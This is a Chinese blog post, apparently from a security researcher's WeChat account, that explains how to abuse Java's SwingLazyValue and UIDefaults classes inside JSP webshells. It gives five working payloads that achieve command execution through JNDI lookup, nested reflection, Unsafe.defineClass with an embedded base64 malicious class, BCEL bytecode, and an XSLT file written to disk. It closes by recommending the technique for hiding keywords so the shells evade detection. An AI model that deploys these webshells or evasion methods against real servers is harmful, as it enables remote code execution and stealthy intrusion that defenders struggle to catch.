#  SwingLazyValue在WebShell下的利用

原创 yzddMr6 [ 网络安全回收站 ](javascript:void\(0\);)

**网络安全回收站** ![]()

微信号 gh_cd24c9599f5f

功能介绍 这里是yzddmr6的公众号，博客的移动端版本，存放本人写的一些垃圾文章。

____

___发表于_

收录于合集

**背景**

##

在Hessian相关的反序列化场景下经常会看到这个链子，本文列举分析一些常见的利用，并且融入到WebShell场景。

  *   *   *   * 

    
    
    UIDefaults.get  UIDefaults.getFromHashTable    UIDefaults$LazyValue.createValue      SwingLazyValue.createValue

##  **  
**

##  **原理**

SwingLazyValue.createValue可以实现一个任意方法的反射，相当于一个反射的包装类。

限制：var2是个Class，不是实例化后的Object对象，所以只能调用静态方法来实现gadgets，因为反射调用静态方法的时候第一个参数可以随便填。

![]()

##  **利用**

###

###  **利用一：JNDI注入**

invoke一个任意静态函数，比较容易想到JNDI注入InitialContext.doLookup()

  *   *   * 

    
    
    javax.swing.UIDefaults#get  sun.swing.SwingLazyValue#createValue    javax.naming.InitialContext#doLookup

  *   *   *   *   *   *   * 

    
    
    <%@ page import="javax.swing.*" %><%    Object o = new sun.swing.SwingLazyValue("javax.naming.InitialContext", "doLookup", new Object[]{"ldap://xxxx"});    UIDefaults uiDefaults = new UIDefaults();    uiDefaults.put("aaa", o);    uiDefaults.get("aaa");%>

起个恶意的ldap即可利用，但是有版本限制，并且需要出网

![]()

  

###  **利用二：套娃反射执行命令**

这个操作其实比较秀了，刚才提到var2只能是一个Class，只能调用一个静态方法，而MethodUtil.invoke就刚好是一个符合条件的利用点，所以我们可以通过套娃反射一个MethodUtil.invoke，将真正想要调用的类方法放到其参数中来突破这一限制。

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <%@ page import="sun.reflect.misc.MethodUtil" %><%@ page import="java.lang.reflect.Method" %><%@ page import="sun.swing.SwingLazyValue" %><%@ page import="javax.swing.*" %><%    Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);    Method exec = Runtime.class.getMethod("exec", String[].class);    String[] command = new String[]{"sh", "-c", "open /"};    SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{command}}});    UIDefaults u1 = new UIDefaults();    u1.put("key", swingLazyValue);    u1.get("key");%>

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    exec:485, Runtime (java.lang)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)invoke:71, Trampoline (sun.reflect.misc)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)invoke:275, MethodUtil (sun.reflect.misc)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)invoke:71, Trampoline (sun.reflect.misc)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)invoke:275, MethodUtil (sun.reflect.misc)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)createValue:73, SwingLazyValue (sun.swing)getFromHashtable:216, UIDefaults (javax.swing)get:161, UIDefaults (javax.swing)main:19, poc2 (SwingLazyValue)

###  **  
**

###  **利用三：defineClass加载字节码**

既然我们已经可以做到不受静态方法的限制做到任意方法的调用，那么我们就可以通过套娃反射调用sun.misc.Unsafe#defineClass

准备好一个恶意类，通过System-property来传递要执行的命令

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public class exp {  
        static {        String cmd = System.getProperty("cmd");        StringBuilder stringBuilder = new StringBuilder();        BufferedReader bufferedReader;        try {            bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()));            String line;  
                while ((line = bufferedReader.readLine()) != null) {                stringBuilder.append(line).append("\n");            }        } catch (IOException e) {            e.printStackTrace();        }        System.setProperty("ret", stringBuilder.toString());    }  
    }

  *   *   *   * 

    
    
    javax.swing.UIDefaults#get  sun.swing.SwingLazyValue#createValue    sun.reflect.misc.MethodUtil#invoke      sun.misc.Unsafe#defineClass

  

这里要触发两次UIDefaults.get，第一次是加载恶意类，第二次是Class.forName触发恶意类的static代码块

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <%@ page import="java.util.Hashtable" %><%@ page import="javax.swing.*" %><%@ page import="sun.swing.SwingLazyValue" %><%@ page import="java.lang.reflect.Method" %><%@ page import="sun.reflect.misc.MethodUtil" %><%@ page import="sun.misc.BASE64Decoder" %><%@ page import="sun.misc.Unsafe" %><%@ page import="java.security.ProtectionDomain" %><%@ page import="java.lang.reflect.Field" %><%    byte[] bcode = new BASE64Decoder().decodeBuffer("yv66vgAAADQAYwoAGAAxCAAnCgAyADMHADQKAAQAMQcANQcANgoANwA4CAA5CgA6ADsKADcAPAoAPQA+CgAHAD8KAAYAQAoABgBBCgAEAEIIAEMHAEQKABIARQgARgoABABHCgAyAEgHAEkHAEoBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxleHA7AQAIPGNsaW5pdD4BAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA1TdGFja01hcFRhYmxlBwBLBwA0BwA1BwBEAQAKU291cmNlRmlsZQEACGV4cC5qYXZhDAAZABoHAEwMAE0ATgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAE8MAFAAUQEAASAHAEsMAFIAUwwAVABVBwBWDABXAFgMABkAWQwAGQBaDABbAFwMAF0AXgEAAQoBABNqYXZhL2lvL0lPRXhjZXB0aW9uDABfABoBAANyZXQMAGAAXAwAYQBiAQADZXhwAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAD3ByaW50U3RhY2tUcmFjZQEACHRvU3RyaW5nAQALc2V0UHJvcGVydHkBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwAhABcAGAAAAAAAAgABABkAGgABABsAAAAvAAEAAQAAAAUqtwABsQAAAAIAHAAAAAYAAQAAAAUAHQAAAAwAAQAAAAUAHgAfAAAACAAgABoAAQAbAAAA+gAHAAQAAABWEgK4AANLuwAEWbcABUy7AAZZuwAHWbgACCoSCbYACrYAC7YADLcADbcADk0stgAPWU7GABErLbYAEBIRtgAQV6f/7KcACE4ttgATEhQrtgAVuAAWV7EAAQAOAEMARgASAAMAHAAAACoACgAAAAgABgAJAA4ADAAsAA8ANQAQAEMAFABGABIARwATAEsAFQBVABYAHQAAADQABQAyABEAIQAiAAMALAAaACMAJAACAEcABAAlACYAAwAGAE8AJwAiAAAADgBHACgAKQABACoAAAAgAAT+ACwHACsHACwHAC0W/wACAAIHACsHACwAAQcALgQAAQAvAAAAAgAw");    System.setProperty("cmd", "open /");    Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);    Method defineClass = Unsafe.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class);    Field f = Unsafe.class.getDeclaredField("theUnsafe");    f.setAccessible(true);    Object unsafe = f.get(null);    Object[] ags = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{"exp", bcode, 0, bcode.length, null, null}}};  
        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", ags);    SwingLazyValue swingLazyValue1 = new SwingLazyValue("exp", null, new Object[0]);  
        Object[] keyValueList = new Object[]{"aaa", swingLazyValue};    Object[] keyValueList1 = new Object[]{"bbb", swingLazyValue1};    UIDefaults uiDefaults1 = new UIDefaults(keyValueList);    UIDefaults uiDefaults2 = new UIDefaults(keyValueList1);    uiDefaults1.get("aaa");    uiDefaults2.get("bbb");  
    %>

  

###  **利用四：BCEL加载字节码**

JDK中还有一个神奇的类：com.sun.org.apache.bcel.internal.util.JavaWrapper，可以通过BCEL加载字节码。

这个类比较小众，在之前的CTF中也被人挖掘了出来。BCEL虽然不需要出网但是会有版本限制。

  *   *   * 

    
    
    javax.swing.UIDefaults#get  sun.swing.SwingLazyValue#createValue    com.sun.org.apache.bcel.internal.util.JavaWrapper#_main

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    <%@ page import="javax.swing.*" %><%@ page import="sun.swing.SwingLazyValue" %><%  
        String payload = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dU$dbR$TY$U$5d$H$9a$9c$d0i$40$C$u$a83$e3$8c$b7$80$c1$ccx$X$itp$f0$82$B$U$Q$8c$f7N$e7$Q$h$93N$aa$d3$a1$f4$8b$7c$f6$rPC$d5$3c$ce$83$9f$e2G$e8$ac$d3$J$81$94m$95$3c$ec$e6$ac$bd$f7$da$d7s$f2$e9$cb$3f$ff$C$b8$84M$T$a3$b8$g$c7$84$89k$b8$$1e$c2$c0U$89i$89$h$s$fe$c4L$i7M$dc$c2_$fa0k$e26$fe6$n1g$o$86$3bZ$dc$d5$O$f7$e2$b8$_1o$o$89$Hqd5$b4$a0$J$X$r$96$q$k$K$c4n$b8$9e$h$cc$It$a7$c6$d7$E$8c$db$95$82$S$Y$c8$ba$9eZ$ac$97$f3$ca_$b5$f3$r$o$c9l$c5$b1Kk$b6$ef$eas$L4$827n$8d$i$d9$b9$z$b74$z$d0$f3$aal$bb$9e$c0$e1$d4$b3$ec$a6$bdegJ$b6W$cc$ac$E$be$eb$V$a7C$fa$Sy5$d97Z$81$fe$7c$7dcC$f9$aa$b0$ac$ec$82$f2$FF$9bVn$r3$db$a1$a1$ad$m$c9H$5b$7d$7fi$ee$9d$a3$aa$81$5b$f1$a83l$bf$b8$r0$U$91$C$abt$ca$F$81$beZx$9e$ad$bb$a50$d2$d87$a6$z$V$3d$faV$C$dby$bb$60W$c3$9a$r$kq$U$e1$U$c6$d9W$B$b3$j$ba$s$b1$cc$f3J$a5$ee$3b$ea$8e$ab$fb$d3$ab$fbr$5es$5b$Y$c3Q$89$V$L$abx$yp$e4$3b$f1$d8$ba$e8$9a$99c$bbZ$afZ$P$e8$a5$ecrS$t$b1fa$jO$d8$96$T$cc$cfB$OO$z$3c$c3s$89$X$W$5e$e2$95$O$feZ$L$a6$91$87c$a1$A$s$tL6$v$a2$85$W6p$94$9d$f2U$60$a1$a8$cd$df$c0e$5bu$z$C$87$f63_$cao$w$t$e8$80$9a$c5$ec$f1$86P$9b$b7$d3$f0$7d$zPe$81DQ$F$P$fdJU$f9$c1$7b$813$a9$88$b5$89$g$e3$e0$3e$b6$5c$f7$C$b7$cczLR$b5$P$p$a9$83$7e$zXoh$adZr$99$f3$d9$a8H$91$hc$a8w$ca$RHE$ae$f4$B$88U8$aaV$ebL$ae$Fr$b9$99$dc$81$c1q$D$f6$S$ec$9c$u$ddGS$91$K$7d$7d$86$f6U$ad$ab$a0$d18$f5$85lx$b1$86S$91$ed$8a$d9$d5$aa$f2$b8$f8$93$3f$d4$e0$fd$e5$l$a8$f2$i$847$60$d5$b7$jF$88$H$95$bd$n$tj$Hgw$z$82$fa$87$a6$89_q$84O$9d$fe$eb$82$d0$f7$84$f2$YO$Z$7e$F$bf$3d$T$db$Q$lC$f5q$caX$T$c4O$94V$eb$ff$9f$f1$L$bf$bd8A$b2$$$ed$y$S$7c$L$7b$88$3dMv$ed$a0$3b$bb$L$p$b7$8d$9e$85$5d$c4r$bb$90$b9$j$c4$cf$r$7b$h0$hH4$60m$a3o$h$fd$8b$93$N$M$e4$a6$8c$ff$90L$8f$Z$N$iJ$OR$ac$7f$f8$fa$f9$D$cc$vCCC$c9$e1t$D$p$3b8$bc$fe$91$b1$fb1$87$7b$7c$5b$bb$c3$cc$s$60RJf$Y$a7$s$814$e5$V$M$d0f$88V$83$98$a7$e5$S$86y$3fG$c2$ecghy$91$d8o8$c9w9M$8eS8M$aeyf$7e$Gg$891$7f$a40$kV$bdJ$fe$93a$cc$y$ce$d1$ba$L$93$c4$e9$f9$Fi$89$f3$S$Z$89$dfG$bf$S$ef$96$f8$a3$89$40H$5c$d0A$402$c1_$V$81$cba$p$af$fc$P$f9$bc$c9$b6h$G$A$A";    System.setProperty("cmd", "open /");    SwingLazyValue swingLazyValue = new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}});    UIDefaults u1 = new UIDefaults();    u1.put("aaa", swingLazyValue);    u1.get("aaa");%>

###  

###  **利用五：落盘XSLT并加载**

由于内置了一些黑名单过滤，NacOS打内存马主要是通过这种方式绕过。首先通过com.sun.org.apache.xml.internal.security.utils.JavaUtils#writeBytesToFilename写入文件，然后通过com.sun.org.apache.xalan.internal.xslt.Process#_main去加载XSLT文件触发transform，达到任意字节码加载的目的。不需要出网，应该没有JDK版本限制，但是要写一个文件，同样需要触发两次。

这个类也捂了很久，但是还是被挖到并公开了。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <%@ page import="java.util.Random" %><%@ page import="java.util.HashMap" %><%@ page import="sun.swing.SwingLazyValue" %><%@ page import="javassist.ClassPool" %><%@ page import="javassist.ClassClassPath" %><%@ page import="javax.swing.*" %><%    String xsltTemplate = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n" +            "xmlns:b64=\"http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\"\n" +            "xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"\n" +            "xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"\n" +            "xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\"\n" +            ">\n" +            "    <xsl:template match=\"/\">\n" +            "      <xsl:variable name=\"bs\" select=\"b64:decodeBuffer(b64:new(),'<base64_payload>')\"/>\n" +            "      <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>\n" +            "      <xsl:variable name=\"rce\" select=\"ru:defineClass('<class_name>',$bs,$cl)\"/>\n" +            "      <xsl:value-of select=\"$rce\"/>\n" +            "    </xsl:template>\n" +            "  </xsl:stylesheet>";  
        String base64Code = "yv66vgAAADQAYwoAGAAxCAAnCgAyADMHADQKAAQAMQcANQcANgoANwA4CAA5CgA6ADsKADcAPAoAPQA+CgAHAD8KAAYAQAoABgBBCgAEAEIIAEMHAEQKABIARQgARgoABABHCgAyAEgHAEkHAEoBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxleHA7AQAIPGNsaW5pdD4BAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA1TdGFja01hcFRhYmxlBwBLBwA0BwA1BwBEAQAKU291cmNlRmlsZQEACGV4cC5qYXZhDAAZABoHAEwMAE0ATgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAE8MAFAAUQEAASAHAEsMAFIAUwwAVABVBwBWDABXAFgMABkAWQwAGQBaDABbAFwMAF0AXgEAAQoBABNqYXZhL2lvL0lPRXhjZXB0aW9uDABfABoBAANyZXQMAGAAXAwAYQBiAQADZXhwAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAD3ByaW50U3RhY2tUcmFjZQEACHRvU3RyaW5nAQALc2V0UHJvcGVydHkBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwAhABcAGAAAAAAAAgABABkAGgABABsAAAAvAAEAAQAAAAUqtwABsQAAAAIAHAAAAAYAAQAAAAsAHQAAAAwAAQAAAAUAHgAfAAAACAAgABoAAQAbAAAA+gAHAAQAAABWEgK4AANLuwAEWbcABUy7AAZZuwAHWbgACCoSCbYACrYAC7YADLcADbcADk0stgAPWU7GABErLbYAEBIRtgAQV6f/7KcACE4ttgATEhQrtgAVuAAWV7EAAQAOAEMARgASAAMAHAAAACoACgAAAA4ABgAPAA4AEgAsABUANQAWAEMAGgBGABgARwAZAEsAGwBVABwAHQAAADQABQAyABEAIQAiAAMALAAaACMAJAACAEcABAAlACYAAwAGAE8AJwAiAAAADgBHACgAKQABACoAAAAgAAT+ACwHACsHACwHAC0W/wACAAIHACsHACwAAQcALgQAAQAvAAAAAgAw";    String xslt = xsltTemplate.replace("<base64_payload>", base64Code).replace("<class_name>", "exp");    System.setProperty("cmd", "open /");    SwingLazyValue value1 = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"/tmp/nacos_data_temp", xslt.getBytes()});  
        SwingLazyValue value2 = new SwingLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{new String[]{"-XT", "-XSL", "file:///tmp/nacos_data_temp"}});  
        UIDefaults uiDefaults = new UIDefaults();    UIDefaults uiDefaults2 = new UIDefaults();    uiDefaults.put("aaa", value1);    uiDefaults2.put("bbb", value2);    uiDefaults.get("aaa");    uiDefaults2.get("bbb");  
    %>

##  

## 优化

sun.swing.SwingLazyValue#createValue 因为ClassLoader的原因
，在SwingLazyValue这里只能加载rt.jar
里面的类，而一些gadgets如jdk.nashorn.internal.codegen.DumpBytecode.dumpBytecode就位于nashorn.jar
里面

![]()

然后有师傅发现了另一个类：javax.swing.UIDefaults.ProxyLazyValue#createValue，这个类中的createValue的实现可以获取线程上下文中的类，应该来说兼容性更强。

##  **最后**

当然还有一些跟其他gadgets结合的利用方式，本文主要挑选了一些较为通用的、可用于WebShell场景的例子。

有些demo看起来有点多次一举，但实际上这个类的最大用处在于可以把一些敏感的关键字放到一个字符串的位置，这样我们就可以对字符串进行变形混淆，从而隐藏掉之前难以避免的特征。

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

